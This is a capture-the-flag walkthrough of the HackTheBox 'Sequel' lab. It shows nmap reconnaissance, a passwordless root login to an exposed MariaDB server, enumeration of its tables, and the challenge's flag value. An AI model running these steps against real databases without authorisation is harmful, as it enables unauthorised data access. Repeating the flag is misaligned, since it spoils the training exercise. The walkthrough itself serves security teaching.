---
title: "HackTheBox Starting Point: Sequel Walkthrough"
date: 2025-02-08
description: ''
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
tags: ["MySQL","Database","Weak Credentials"]
---

In this walkthrough, we will exploit an unsecured **MariaDB (MySQL)** service to retrieve sensitive data, including a flag stored within the database. Exposed database services are a common misconfiguration in real-world environments, making them prime targets for attackers. Let’s explore how we can enumerate and exploit this vulnerability.

## Reconnaissance

Before attacking the system, we need to gather as much information as possible. We start by scanning the target `10.129.68.0` using `Nmap` to identify open ports and running services.

```sql
└─$ sudo nmap -sV -sC 10.129.68.0   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 12:56 WIB
Stats: 0:02:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.68.0
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: InteractiveClient, Support41Auth, ODBCClient, SupportsTransactions, FoundRows, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsCompression, LongColumnFlag, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: <54D:6A"#+N'u:^LBFvA
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.52 seconds

```

### Analysis of Scan Results

- The scan reveals that port `3306` (MySQL) is open.
- The database server is running `MariaDB 10.3.27` on `Debian 10`.
- No authentication checks were detected in the scan output, which might indicate weak or missing credentials.

Since the MySQL service is accessible over the network, we attempt to connect using common default credentials.

## Foothold

Given that the database is exposed, we try to connect to it without a password.

```sql
└─$ mysql -h 10.129.68.0 -u root --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 77
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.269 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.266 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.266 sec)
```

The htb database looks interesting, so we switch to it and enumerate its tables.

```sql
MariaDB [(none)]> use htb;
Database changed

MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+

```

The `config` table often contains sensitive system information. Let’s see what it holds.

```sql
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```

## Flag

The config table contains a flag stored as a value:

```sql
7b4bec00d1a39e3dd4e021ec3d915da8
```